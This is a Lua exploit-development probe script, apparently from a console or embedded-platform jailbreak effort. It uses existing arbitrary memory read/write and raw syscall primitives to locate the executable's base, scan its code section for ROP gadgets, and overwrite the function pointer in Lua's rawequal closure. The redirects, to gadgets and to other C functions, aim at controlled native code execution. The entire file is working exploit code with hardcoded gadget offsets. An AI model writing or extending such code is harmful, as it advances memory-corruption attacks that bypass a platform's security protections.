-- CRASH_CLASS: MODERATE
-- PROBE 108a: CClosure +0x20 redirect to eboot gadgets
--
-- 56c/56f showed CClosure fn redirect works for existing Lua C targets.
-- This probe tests: can we redirect to ARBITRARY eboot gadget addresses
-- and have Lua survive? If yes, we get controlled code execution within
-- the eboot RX .text section.
--
-- Key: CClosure->fn(L) is called with L in RDI. Return value = count
-- of values pushed to Lua stack. xor eax,eax;ret returns 0 = safe.

print("=== PROBE 108a: CCLOSURE GADGET CHAIN ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local pid=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print("pid="..pid)

-- Eboot base
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local EB=N(uint64(string.format("0x%X%08X",ehi,elo)))
print(string.format("eboot=0x%X%08X", ehi, elo))

-- Known gadgets from previous probes
local RET_OFF=0x993       -- ret (inside pop rax;ret at 0x992)
local PRAX_OFF=0x992      -- pop rax; ret
local WMOV_OFF=0x92C67    -- mov [rdi],rax; ret
local PRDI_OFF=0xC9DFE    -- pop rdi; ret
local PRSI_OFF=0xD77D     -- pop rsi; ret

local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end

-- ============================================================
print("")
print("--- A: FIND xor eax,eax;ret IN EBOOT ---")
-- Pattern: 31 C0 C3 (3 bytes). Scan using dword reads.
-- In LE dword: if at offset 0 → low 3 bytes = 0x__C3C031
-- We scan dword-aligned and check byte patterns.
local found_xor = nil
local text_size = rd(inf+0x110) or 0
if text_size<0 then text_size=text_size+0x100000000 end
local scan_limit = math.min(text_size, 0x100000)  -- 1MB max
print(string.format("  scanning %dKB of .text...", scan_limit/1024))

for off=0,scan_limit-4,2 do
    local d=rd(EB+off)
    if d==nil then break end

    -- Check byte 0,1,2: pattern 31 C0 C3
    if d and (d % 0x1000000) == 0xC3C031 then
        found_xor = off
        print(string.format("  FOUND xor eax,eax;ret at eboot+0x%X", off))
        break
    end
    -- Check byte 1,2,3: shift right 8
    local hi3 = math.floor(d / 256)
    if hi3 == 0xC3C031 then
        found_xor = off + 1
        print(string.format("  FOUND xor eax,eax;ret at eboot+0x%X", off+1))
        break
    end
end
if not found_xor then
    print("  xor eax,eax;ret NOT FOUND — will use plain ret")
end

-- ============================================================
print("")
print("--- B: GET rawequal CCLOSURE ---")
local re_str = tostring(rawequal)
local re_hex = re_str:match(":%s*0?x?([0-9a-fA-F]+)")
if not re_hex then print("  CANNOT PARSE rawequal addr: "..re_str) return end
local RE = N(uint64("0x"..re_hex))
print(string.format("  rawequal CClosure = 0x%s (%d hex digits)", re_hex, #re_hex))

local orig_fn = rq(RE + 0x20)
print(string.format("  original fn = %s", tostring(orig_fn)))

-- ============================================================
print("")
print("--- C: REDIRECT TO xor eax,eax;ret (return 0) ---")
-- Return 0 = "pushed 0 values" → Lua gets nil from rawequal
local xor_ga = found_xor and ga(found_xor) or ga(RET_OFF)
local xor_label = found_xor and string.format("xor@+0x%X",found_xor) or "ret@+0x993"
print(string.format("  target: %s = %s", xor_label, tostring(xor_ga)))

pcall(function() memory.write_qword(RE + 0x20, xor_ga) end)
local verify_c = rq(RE + 0x20)
print(string.format("  +0x20 now: %s (expect %s)", tostring(verify_c), tostring(xor_ga)))

local ok_c, rv_c = pcall(function() return rawequal(1, 2) end)
local c_pid = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
print(string.format("  call ok=%s result=%s type=%s canary=%s",
    tostring(ok_c), tostring(rv_c), type(rv_c),
    c_pid==pid and "OK" or "FAIL"))

-- Restore
pcall(function() memory.write_qword(RE + 0x20, orig_fn) end)
local ok_r1,rv_r1 = pcall(function() return rawequal(1,1) end)
print(string.format("  restore: rawequal(1,1)=%s", tostring(rv_r1)))

if c_pid~=pid then print("PROCESS DIED") return end

if ok_c then
    print("  *** GADGET REDIRECT SURVIVED! ***")
else
    print(string.format("  Lua error: %s", tostring(rv_c)))
end

-- ============================================================
print("")
print("--- D: REDIRECT TO ret (return RAX=whatever) ---")
-- Plain ret: RAX is whatever the Lua VM left in it.
-- Likely a large number → Lua tries to pop that many stack values → crash
-- Wrapped in pcall so we survive.
local ret_ga = ga(RET_OFF)
print(string.format("  target: ret@+0x993"))

pcall(function() memory.write_qword(RE + 0x20, ret_ga) end)
local ok_d, rv_d = pcall(function() return rawequal(1, 2) end)
local d_pid = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
print(string.format("  call ok=%s result=%s canary=%s",
    tostring(ok_d), tostring(rv_d),
    d_pid==pid and "OK" or "FAIL"))

pcall(function() memory.write_qword(RE + 0x20, orig_fn) end)
local ok_r2,rv_r2 = pcall(function() return rawequal(1,1) end)
print(string.format("  restore: rawequal(1,1)=%s", tostring(rv_r2)))

if d_pid~=pid then print("PROCESS DIED") return end

-- ============================================================
print("")
print("--- E: REDIRECT TO mov [rdi],rax;ret (WRITE to L) ---")
-- WMOV = mov [rdi],rax;ret → writes RAX to *L (lua_State first qword)
-- This is DESTRUCTIVE if it writes garbage. Let's save L[0] first.
-- Actually this is too dangerous — it overwrites the lua_State. Skip.
-- Instead, test: redirect to a function that just reads L.

print("  SKIPPED (too destructive — overwrites lua_State)")

-- ============================================================
print("")
print("--- F: REDIRECT rawequal TO type() C function ---")
-- 56c did rawequal→rawget. Let's do rawequal→type.
-- type(arg1) returns the type name of its first argument.
-- When called as rawequal(42, "hello"), type sees 42 as arg1 → returns "number"

local type_str = tostring(type)
local type_hex = type_str:match(":%s*0?x?([0-9a-fA-F]+)")
if type_hex then
    local TYPE_CLOSURE = N(uint64("0x"..type_hex))
    local type_fn = rq(TYPE_CLOSURE + 0x20)
    print(string.format("  type() fn = %s", tostring(type_fn)))

    -- Redirect rawequal → type's C function
    pcall(function() memory.write_qword(RE + 0x20, type_fn) end)

    -- rawequal(42, "test") → should return "number" (type of first arg)
    local ok_f, rv_f = pcall(function() return rawequal(42, "test") end)
    local f_pid = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
    print(string.format("  rawequal(42,'test') = ok=%s result='%s' canary=%s",
        tostring(ok_f), tostring(rv_f),
        f_pid==pid and "OK" or "FAIL"))

    -- rawequal("hello", 99) → should return "string"
    local ok_f2, rv_f2 = pcall(function() return rawequal("hello", 99) end)
    print(string.format("  rawequal('hello',99) = ok=%s result='%s'",
        tostring(ok_f2), tostring(rv_f2)))

    -- Restore
    pcall(function() memory.write_qword(RE + 0x20, orig_fn) end)
    local ok_rf,rv_rf = pcall(function() return rawequal(1,1) end)
    print(string.format("  restore: rawequal(1,1)=%s", tostring(rv_rf)))

    if f_pid~=pid then print("PROCESS DIED") return end

    if ok_f and rv_f=="number" then
        print("  *** CROSS-FUNCTION REDIRECT CONFIRMED! ***")
    end
end

-- ============================================================
print("")
print("--- G: REDIRECT TO getpid WRAPPER (native.fcall_with_rax) ---")
-- Can we redirect rawequal to a function that calls getpid?
-- tostring() gives us the address of the Lua C function.
-- What about redirecting to the actual getpid syscall stub?

-- Test: redirect to tostring's C function
local ts_str = tostring(tostring)
local ts_hex = ts_str:match(":%s*0?x?([0-9a-fA-F]+)")
if ts_hex then
    local TS_CLOSURE = N(uint64("0x"..ts_hex))
    local ts_fn = rq(TS_CLOSURE + 0x20)
    print(string.format("  tostring() fn = %s", tostring(ts_fn)))

    pcall(function() memory.write_qword(RE + 0x20, ts_fn) end)

    -- rawequal(42) → should act like tostring(42) → "42"
    local ok_g, rv_g = pcall(function() return rawequal(42) end)
    local g_pid = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
    print(string.format("  rawequal(42) as tostring = ok=%s result='%s' canary=%s",
        tostring(ok_g), tostring(rv_g),
        g_pid==pid and "OK" or "FAIL"))

    pcall(function() memory.write_qword(RE + 0x20, orig_fn) end)
    if g_pid~=pid then print("PROCESS DIED") return end
end

-- ============================================================
print("")
print("--- H: REDIRECT TO string.len (return number) ---")
local sl_str = tostring(string.len)
local sl_hex = sl_str:match(":%s*0?x?([0-9a-fA-F]+)")
if sl_hex then
    local SL_CLOSURE = N(uint64("0x"..sl_hex))
    local sl_fn = rq(SL_CLOSURE + 0x20)
    print(string.format("  string.len fn = %s", tostring(sl_fn)))

    pcall(function() memory.write_qword(RE + 0x20, sl_fn) end)

    -- rawequal("hello world") → should act like string.len("hello world") → 11
    local ok_h, rv_h = pcall(function() return rawequal("hello world") end)
    local h_pid = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
    print(string.format("  rawequal('hello world') as strlen = ok=%s result=%s canary=%s",
        tostring(ok_h), tostring(rv_h),
        h_pid==pid and "OK" or "FAIL"))

    -- rawequal("test") → should return 4
    local ok_h2, rv_h2 = pcall(function() return rawequal("test") end)
    print(string.format("  rawequal('test') as strlen = ok=%s result=%s",
        tostring(ok_h2), tostring(rv_h2)))

    pcall(function() memory.write_qword(RE + 0x20, orig_fn) end)
    if h_pid~=pid then print("PROCESS DIED") return end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 108a COMPLETE ===")
